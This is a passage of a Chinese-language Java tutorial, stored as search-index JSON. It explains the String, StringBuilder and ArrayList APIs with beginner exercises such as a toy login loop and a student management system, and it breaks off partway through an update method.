s1.equalsIgnoreCase(s2);//true,Boolean b2 = s1.equalsIgnoreCase(s3);//true boolean startsWith(String str) 功能：判断字符串对象是否以指定的str开头。 示例： s = \"hello\"; syso(s.startsWith(\"he\");//true，Boolean b = s.startWith(\"abc\");//false boolean endsWith(String str) 功能：判断字符串对象是否以指定的str结尾。 示例: 同上 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:2:5","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"模拟用户登录案例（使用String的判断功能） import java.util.Scanner; public class StringEqual { /* * 模拟登录，给三次机会，并提示还有几次 * * 分析: * A: 定义两个字符串对象，用于存储已经存在的用户名和密码 * B: 键盘录入用户名和密码 * C: 进行比较，相同则登录成功，不同则显示登录失败，并提示还有几次机会 * */ public static void main(String[] args) { //定义字符串对象，存储已经存在的用户名和密码 String usename = \"admin\"; String password = \"admin\"; //控制循环三次 for(int i = 0; i \u003c 3; i++) { //键盘录入用户名和密码 Scanner sc = new Scanner(System.in); System.out.println(\"请输入用户名：\"); String name = sc.nextLine(); System.out.println(\"请输入密码：\"); String pwd = sc.nextLine(); if((name.equals(usename)) \u0026\u0026 (pwd.equals(password))) { System.out.println(\"登录成功!\"); break;//登录成功要及时推出循环 }else { if((2-i)==0) System.out.println(\"账户被锁定，请与管理员联系\"); else System.out.println(\"登录失败，你还有\"+(2-i)+\"次机会\");//2,1,0 } } } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:2:6","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"String的获取功能 int length()： 功能：获取字符串的长度，即字符个数。 非常常用。 注意区分属性arr.length和方法str.length() - 有无小括号 char charAt(int index)： 功能：获取指定索引处的字符。 可用于对字符串进行遍历。 注：如果传入的索引值越界，会报错StringIndexOutOfBoundsException int indexOf(String str)： 功能：获取str在字符串对象中第一次出现的索引 \u003c注意：返回的是小字符串的第一个字符的索引值\u003e。 没找到时返回-1. String substring(int start)： 功能：从索引值start开始截取字符串(默认截取到末尾)。 String substring(int start,int end)： 功能：从索引值start开始，到索引值end结束截取字符串，左闭右开\u003c不包含end索引值对应的字符\u003e。 注：如果传入的索引值越界，会报错StringIndexOutOfBoundsException 注意：字符串子串截取功能的索引值：超出一个边界值不报错。 例如，当字符串为空时，substring(0)不报错，截取到的子串为空； 当字符串只有一个字符时，substring(0,1)和substring(1)不报错，且substring(1)截取到的子串为空。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:2:7","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"String的转换功能 char[] toCharArray() 功能：把字符串转换为字符数组。 示例：char[] chs = s.toCharArray(); String toLowerCase() 功能：把字符串转换为小写字符串。 示例：\"helloWORLD\".toLowerCase(); String toUpperCase() 功能：把字符串转换为大写字符串。 示例：\"helloWORLD\".toUpperCase(); 注：转换大小写时，若字符串中有除字母外的其他字符，则其他字符不变。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:2:8","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"String的其他功能 去除字符串两端空格：String trim() 代码示例：String s2 = s1.trim(); 注：去除两端的一个或多个空格。 按照指定符号分割字符串：String[] split(String str) 代码示例：String[] strArray = s.split(\",\");//用逗号分隔字符串并返回字符串数组 空格分隔的问题： split参数中的空格数量是严格区分的。 当split中仅传入split(\"\")，双引号中间没有空格时，会将字符串按照每个字符分隔，包含每个空格。 当split中传入多个空格时，例如split(\" \")，三个空格，则只会在三个连续空格处分隔。 当split中仅传入一个空格而字符串中包含连续的多个空格时，只会去掉一个空格，中间剩余空格将作为元素占位存入字符串数组。 例如：ab---c--de用split(\" \")分隔后，将得到长度为6的数组，且数组为[ab, , ,c, ,de] 去掉不确定数量的空格的代码示例：String[] strArray = s.split(\" +\"); 例如：ab---c--de用split(\" +\")分隔后，将得到长度为3的数组，且数组为[ab,c,de] 注：通过toString()得到的数组字符串形式自带方括号，且逗号前自带一个空格。 注意：本方法的返回值类型是字符串数组。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:2:9","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"典型问题 遍历字符串 \u003c字符串获取/字符串转换\u003e 法1：循环；获取长度作为循环边界；获取指定索引字符并传入循环参数进行遍历。 for(int i = 0; i \u003c s.length(); i++){syso(s.charAt(i));} 法2：先转为字符数组，然后对字符数组进行遍历。 char[] chs = s.toCharArray(); for(int i=0; i\u003cchs.length; i++){} 统计一个字符串中的大写字符字符、小写字母字符、数字字符的分别的个数 \u003c字符串获取\u003e 定义三个计数器；遍历获取每个字符；对’每个字符‘进行判断，并将相应的计数器+1；返回结果。 设ch是一个字符：对获取到的字符进行if-else if的判断。 大写：ch\u003e=‘A’ \u0026\u0026 ch\u003c=‘Z’; 小写：ch\u003e=‘a’ \u0026\u0026 ch\u003c=‘z’; 数字：ch\u003e=‘0’ \u0026\u0026 ch\u003c=‘9’; 注：最初反应是对应A-65,a-97的设定，后来发现直接用字符本体判断即可了。 打印数组名特例 数值型数组如int型数组：初始化后直接打印数组名，输出的是地址值。 char类型数组输出总结: 直接输出数组名：将数组以字符串形式打印； 输出前面加字符：输出的是地址； 输出前面加字符的情况下想要输出数组内容：Arrays.toString(ch)，数组内容将以数组形式输出。 注：直接打印字符串变量名，输出的也是字符串内容；前面加字符串后，输出的仍是字符串内容。 注：字符串数组直接输出的是地址值。 参考：【JAVA】java中char类型数组用数组名打印结果不是地址值而是数组内容 将字符串首字母大写，其他字符小写 \u003c字符串转换\u003e 截取字符串片段；分别进行大小写转换；然后用+号连接； 方法：substring(); toUpperCase(); toLowerCase(); + . 代码示例： String s3 = s1.substring(0,1).toUpperCase() + s1.substring(1).toLowerCase(); 注意： Char同样有类似方法: char toUpperCase(char ch)，也可考虑s1.charAt(0)截第一个字符，这里讲String方法就统一按String截取了。 substring()可能字符串索引越界异常，因此最好进行判断；但当字符串只有一个字符时，以上代码不报错。 字符串反转 思路1：倒着遍历字符串； 倒着遍历，然后拼接字符串。 返回值：String；参数列表：String s。 String ss = \"\"; for(int i = s.length()-1; i\u003e=0; i++){ss += s.charAt(i);} return ss; 思路2：把字符串转换为字符数组，对字符数组反转，然后转换为字符串并返回。 双指针交换元素值。 返回值：String；参数列表：String s。 char[] chs = s.toCharArray(); for(int start=0,end=chs.length-1; start\u003c=end; start++,end--){交换start与end对应字符} return new String(chs); //构造方法，讲字符数组传入即可，可省略定义新的String ss = new String(chs);,直接返回 主函数调用：String str = reverse(s); ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:2:10","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:2:11","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"StringBuilder ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:3:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"StringBuilder和String的区别 String: 内容固定，不可变。 StringBuilder：可变字符串。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:3:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"StringBuilder类概述 字符串缓冲区，可变字符串。 字符串拼接的弊端 String每次拼接，都会构建一个新的String对象，既耗时，又浪费空间；而StringBuilder就可以解决这个问题。 图解： ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:3:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"StringBuilder构造方法： 无参构造：public StringBuilder() 构造一个不带任何字符的字符串生成器，其初始容量为 16 个字符。 代码示例：StringBuilder sb = new StringBuilder(\"xxxx\"); ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:3:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"StringBuilder的功能 查询容量： public int capacity()：返回当前容量 代码示例：int n = sb.capacity(); public int length()：返回长度（字符数）。 代码示例：int n = sb.length(); 区别：容量是理论值，长度是实际值。 当字符串缓冲区中还没有存储元素时，容量可能是16(默认值)，但长度是0。 添加功能：public StringBuilder append(任意类型) 添加数据，并返回自身对象。(即可变字符串类型的值) 参数可以是任意类型：任意类型拼接过来以后组成新的字符串 StringBuilder sb2 = sb.append(\"hello\"); Boolean b = (sb==sb2);//ture 代码示例： 单个：sb.append(\"hello\"); sb.append(true); sb.append(100); //输出：hellotrue100 链式：sb.append(\"hello\").append(true).append(100);//输出：hellotrue100 因为返回值是字符串缓冲区类型，是对象，仍可以调用功能。 注意：需要一次添加多个字符串时，使用链式append，不要再使用+连接了。 反转功能：public StringBuilder reverse() 代码示例：sb.reverse();//输出：001eurtolleh ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:3:4","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"String和StringBuilder相互转换 StringBuilder转为String： public String toString()：返回此序列中数据的字符串表示形式。 代码示例：String s = sb.toString();//sb是字符串缓冲区变量名 String转为StringBuilder： 通过sb的构造方法：public StringBuilder(String str) 构造一个字符串生成器，并初始化为指定的字符串内容。 代码示例：StringBuilder sb = new StringBuilder(s);//s是字符串变量名 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:3:5","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"典型问题 字符串反转： 之前提供过两种思路：倒序遍历并连接到主字符串；转换为字符数组后前后指针获取并交换各值。 思路：利用StringBuilder的reverse()功能 String –\u003e StringBuilder –\u003e reverse –\u003e String –\u003e return 注：使用字符串缓冲区的构造方法，将字符串s作为参数传入，以此来转为StringBuilder类型。 判断一个字符串是否是回文串： 思路：反转字符串；与反转前的字符串比较：若相等，说明对称；返回结果。 代码示例：boolean res = sb.reverse().toString().equals(sb);//s是原字符串，sb是字符串缓冲区变量 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:3:6","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"StringBuffer与StringBuilder 功能完全相同。 区别： StringBuilder是非线程安全的，访问速度更快，用于单线程代码。 StringBuffer是线程安全的，访问速度慢，用于多线程代码。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:3:7","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:3:8","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"对象数组的练习 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:4:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"题目 题目：创建一个学生数组，存储三个学生对象并遍历 ObjectArray相关练习 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:4:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"自动生成构造函数和getXxx(), setXxx()方法 A：自动生成构造方法： 无参构造：代码区域右键 – Source – Generate Constructors from Superclass.. 带参构造：代码区域右键 – Source – Generate Constructors using Fields…: B：自动生成get、set方法： 同时生成、可选：代码区域右键 – Source – Generate Getters and Setters.. – select all ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:4:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"步骤分析 定义学生类 创建学生数组 创建学生对象 把学生对象作为元素赋值给学生数组 遍历学生数组 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:4:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"代码示例 定义学生类的代码： package com.itcast; public class Student { private String name; //成员方法记得写修饰符 (与main方法对应) private int age; //成员方法记得写修饰符 (与main方法对应) public Student() {//自动生成的无参构造 super();//可去掉 // TODO Auto-generated constructor stub } public Student(String name, int age) {//自动生成的带参构造 super();//可去掉 this.name = name; this.age = age; } //自动生成的get/set方法 public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } 学生类演示代码 package com.itcast; public class StudentDemo { public static void main(String[] args) { //创建学生数组 Student[] students = new Student[3]; //创建学生对象 Student s1 = new Student(\"曹操\", 40); Student s2 = new Student(\"刘备\", 35); Student s3 = new Student(\"孙权\", 30); //把学生对象作为元素赋值给学生数组 students[0] = s1; students[1] = s2; students[2] = s3; //遍历学生数组 for(int i = 0; i \u003c students.length; i++) { Student s = students[i]; System.out.println(s.getName() + \"---\" + s.getAge()); //直接打印对象名输出的是地址值，这里用get方法获取 } } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:4:4","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"对象数组的内存图 图示： ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:4:5","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:4:6","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"集合类与ArrayList ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:5:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"集合类引入 面向对象语言对事物的描述是通过对象体现的; 为了方便对多个对象进行操作，必须把这多个对象进行存储。 而要想存储多个对象，就不能是一个基本的变量，而应该是一个容器类型的变量。 已经学过的，有哪些是容器类型的呢? 数组和StringBuilder StringBuilder的结果是一个字符串，不一定满足我们的要求， 所以我们只能选择数组，这就是对象数组。 对象数组的弊端：不能适应变化的需求，因为数组的长度是固定的 因此：为了适应变化的需求，Java就提供了 \u003c集合类\u003e 供我们使用。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:5:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"集合类的特点： 长度可变 (相比数组的优势) ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:5:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"ArrayList概述 最常用的集合，通过阅读API学习 java.util包下：因此需要导包 import java.util.ArrayList; ArrayList\u003cE\u003e：大小可变数组的实现。 \u003cE\u003e：一种特殊的数据类型，泛型。 在出现E的地方，暂时可以使用引用数据类型替换。 举例：ArrayList\u003cString\u003e, ArrayList\u003cStudent\u003e, … 打印自带小括号：syso输出 ‘array：[hello, world]’ ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:5:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"构造方法 无参：ArrayList() 示例：ArrayList\u003cString\u003e array = new ArrayList\u003cString\u003e();//可以参考数组的定义格式 无参：ArrayList()： ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:5:4","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"添加元素 public boolean add(E e): 依次添加元素，E根据定义的类型确定，用的多 示例：array.add(\"hello\"); //这条可作为一行独立代码 public void add(int index, E element): 在指定索引处添加元素，而原位置元素顺次后移一位，用的不多 示例：array.add(1, \"java\");//原来索引1处的元素会顺次后移到索引2处 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:5:5","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"添加元素的代码演示： package com.itcast01; import java.util.ArrayList; public class ArrayListDemo { public static void main(String[] args) { ArrayList\u003cString\u003e array = new ArrayList\u003cString\u003e(); System.out.println(\"array=\"+array);//输出：array=[] array.add(\"hello\"); array.add(\"world\"); System.out.println(\"array：\"+array);//array：[hello, world] array.add(1, \"android\"); System.out.println(\"array：\"+array);//array：[hello, android, world] } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:5:6","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"增删改查 获取元素： public E get(int index): 返回指定索引处的元素 注意：get方法不改变原有集合 示例：System.out.println(\"get:\"+array.get(0)); 集合长度： public int size(): 返回集合中的元素的个数 示例：System.out.println(\"size:\"+array.size()); 删除元素： public boolean remove(Object o): 删除指定的元素，并返回删除是否成功（布尔型） 注意：若存在，即可删除并返回true，否则返回false；成功时仅删除第一个，再次remove时删除下一个该元素。 示例：array.remove(\"hello\"); public E remove(int index): 删除指定索引处的元素，并返回被删除的元素 注意：输入的是索引值，需要注意越界错误 示例：System.out.println(\"remove(index)\": + array.remove(i)); 修改元素： public E set(int index, E element) – 修改指定索引处的元素，返回被修改的元素（原来的元素） 示例：System.out.println(\"set:\"+array.set(1,\"python\")); ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:5:7","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"增删改查的代码演示 package com.itcast01; import java.util.ArrayList; public class ArrayListDemo2 { public static void main(String[] args) { //创建集合对象 ArrayList\u003cString\u003e array = new ArrayList\u003cString\u003e(); //添加元素 array.add(\"hello\"); array.add(\"java\"); array.add(\"world\"); System.out.println(\"array:\"+array);//array:[hello, java, world] //获取元素 System.out.println(\"get:\"+array.get(2));//get:world //集合长度 System.out.println(\"size:\"+array.size());//size:3 //删除元素 System.out.println(\"remove:\"+array.remove(\"hello\"));//remove:true System.out.println(\"remove:\"+array.remove(\"hello\"));//remove:false array.add(0,\"hello\"); System.out.println(\"remove-index:\"+array.remove(0));//remove-index:hello array.add(0,\"hello\"); //修改元素 System.out.println(\"set:\"+array.set(1, \"android\"));//set:java (返回被替代的元素) System.out.println(\"array:\"+array);//array:[hello, android, world] } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:5:8","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"集合遍历 用for循环 + size()方法 + get()方法 注：常规的做法是，输出时，先将get获取到的元素存储在变量中，然后输出变量。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:5:9","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"集合遍历的代码演示 package com.itcast01; import java.util.ArrayList; public class ArrayListDemo3 { public static void main(String[] args) { //新建集合 ArrayList\u003cString\u003e array = new ArrayList\u003cString\u003e(); array.add(\"hello\"); array.add(\"world\"); array.add(\"java\"); for(int i = 0; i \u003c array.size(); i++) {//size()获取数组集合的大小 //System.out.println(array.get(i)); String s = array.get(i);//get()获取数组集合中的元素 System.out.println(s);//先get()存起来而不是直接输出，是标准用法 } } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:5:10","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ​ ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:5:11","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"ArrayList案例分析 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:6:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"获取满足要求的元素 题目： 给定一个字符串数组：{“张三丰”,“宋远桥”,“张无忌”,“殷梨亭”,“张翠山”,“莫声谷”}， 将数组中的元素添加到集合中，并把所有姓张的人员打印到控制台上。 分析： 定义字符串数组； 创建集合对象； 遍历字符串数组，获取每个元素，并添加到集合； 遍历集合：判断字符串元素是否以“张”开头，如果是，就输出。 方法： size()，get(i)，startswith(“xxx”)， 代码： package com.itcast01; import java.util.ArrayList; public class ArrayListTest { public static void main(String[] args) { String[] strArray = {\"张三丰\",\"宋远桥\", \"张无忌\",\"殷梨亭\",\"张翠山\",\"莫声谷\"};//不是重头戏，直接赋值 ArrayList\u003cString\u003e array = new ArrayList\u003cString\u003e(); for(int i = 0; i \u003c strArray.length; i++) { array.add(strArray[i]);//遍历添加元素 } System.out.println(array);// for(int j = 0; j \u003c array.size(); j++) { String s = array.get(j);//遍历获取集合元素 if(s.startsWith(\"张\"))//判断是否以\"张\"开头 System.out.println(s); } } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:6:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"存储自定义对象并遍历 自定义Student对象 包括：成员变量name和age，无参构造，带参构造，get、set方法 新建集合，新建Student对象，并将Student对象存入集合 遍历集合并输出 注意点： 创建集合对象：ArrayList\u003cStudent\u003e array = new ArrayList\u003cStudent\u003e(); for循环遍历时，接受变量为Student s = array.get(i); 输出时，使用Student定义的获取方法：System.out.println(s.getName()+s.getAge()); ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:6:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"键盘录入数据存储并遍历 题目： 创建一个集合，存储学生对象，学生对象的数据来自于键盘录入，最后，遍历集合 分析： 定义学生类； 创建集合对象； 键盘录入，创建学生对象，并将键盘录入的数据赋值给学生对象的成员变量； 把学生对象作为元素存储到集合中； 遍历集合。 注： 为了方便使用，这个把学生类中的所有成员变量定义为String类型 将键盘录入方法进行封装 代码： Student.java ckage com.itcast01; blic class Student { ivate String name; ivate String age; blic Student() { blic Student(String name, String age) { is.name = name; is.age = age; blic String getName() { turn name; blic void setName(String name) { is.name = name; blic String getAge() { turn age; blic void setAge(String age) { is.age = age; ArrayListTest2.java ckage com.itcast01; port java.util.ArrayList; port java.util.Scanner; blic class ArrayListTest2 { blic static void main(String[] args) { rayList\u003cStudent\u003e array = new ArrayList\u003cStudent\u003e(); 调用方法：调用一次方法，执行一次 dStudent(array); dStudent(array); dStudent(array); r(int i = 0; i \u003c array.size(); i++) { udent s = array.get(i); stem.out.println(s.getName() + \"--\" + s.getAge()); 为了提高代码复用性，进行封装。 写方法：两个明确 返回值类型： void 参数列表：ArrayList\u003cStudent\u003e array */ ivate static void addStudent(ArrayList\u003cStudent\u003e array) { anner sc = new Scanner(System.in); stem.out.println(\"请输入学生姓名：\"); ring name = sc.nextLine(); stem.out.println(\"请输入学生年龄：\"); ring age = sc.nextLine(); udent s = new Student(); setName(name); setAge(age); ray.add(s); ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:6:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:6:4","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"集合版学生管理系统 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:7:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"注意： 本部分展示完整代码，因此篇幅较长，可选择性跳过。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:7:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"练习概述 题目：学生管理系统的主界面 + 学生类的增删改查 步骤： 两个类：学生类和学生管理系统主类 定义学生类； 学生管理系统的主界面的代码编写； 学生管理系统的查看所有学生的代码编写； 学生管理系统的添加学生的代码编写； 学生管理系统的删除学生的代码编写； 学生管理系统的修改学生的代码编写； ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:7:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"学生类代码 步骤：定义成员变量，之后生成构造方法(无参/带参)，get()/set()方法 注意成员变量：private修饰，包括”学号，姓名，年龄，居住地“ package test.StudentArray; //学生类 public class Student { //定义成员变量 private String id; private String name; private String age; private String address; //生成构造函数：无参/带参 public Student() { } public Student(String id, String name, String age, String address) { this.id = id; this.name = name; this.age = age; this.address = address; } //生成get()/set()函数 public String getId() { return id; } public void setId(String id) { this.id = id; } public String getName() { return name; } public void setName(String name) { this.name = name; } public String getAge() { return age; } public void setAge(String age) { this.age = age; } public String getAddress() { return address; } public void setAddress(String address) { this.address = address; } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:7:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"学生管理类代码 步骤：依次定义主界面、查看、添加、删除、修改的代码 主界面：循环，提示语，选项展示，输入及判断 为了回到最初的界面，可加入while(true){}循环，直至退出(System.exit(0);//JVM退出) 输入判断用switch更贴合条件；case为String与输入的数据类型对应；记得最后的default。 case “5\"和default：都输入一条”谢谢“，可以用到case穿透 查看学生类：创建容器(循环外创建即可)，调用自定义的查看方法，并写该方法 输入时加入\\t 制表符tab键的位置，可以更好地对齐 \u003c注意\\t在双引号里\u003e 添加学生类：键盘录入，存储，set()方法赋值给学生类对象 学号重复问题：while(true) + flag循环 关键代码：if(s.getId().equals(id)) {} 删除学生对象：根据学号删除对应的学生对象 遍历对比，根据索引值remove array集合的对象 关键代码：if(s.getId().equals(id)) { array.remove(x); break; } 同样注意学号不存在问题：定义flag进行标记， 关键代码：if(index==-1) syso(\"要删除的对象不存在\") 修改学生：依然根据学号 加判断考虑学号不存在的情况 package test.StudentArray; import java.util.ArrayList; import java.util.Scanner; public class StudentManager { public static void main(String[] args) { // 定义存储学生类的集合 ArrayList\u003cStudent\u003e array = new ArrayList\u003cStudent\u003e(); // 这是学生管理系统的主界面 // 循环直至退出 while (true) { System.out.println(\"--------欢迎来到学生管理系统--------\"); System.out.println(\"1. 查看所有学生\"); System.out.println(\"2. 添加学生\"); System.out.println(\"3. 删除学生\"); System.out.println(\"4. 修改学生\"); System.out.println(\"5. 退出\"); System.out.println(\"请输入你的选择：\"); // 创建键盘录入对象 Scanner sc = new Scanner(System.in); String choiceString = sc.nextLine(); // 用switch语句实现选择 switch (choiceString) { case \"1\": // 查看所有学生 findAllStudents(array); break; case \"2\": // 添加学生 addStudent(array); break; case \"3\": deleteStudent(array); // 删除学生 break; case \"4\": // 修改学生 updateStudent(array); break; case \"5\": // 退出 // break; default: System.out.println(\"谢谢你的使用 \"); System.exit(0);// JVM退出 break; } } } //修改学生 public static void updateStudent(ArrayList\u003cStudent\u003e array) { //创建键盘录入对象 Scanner sc = new Scanner(System.in); 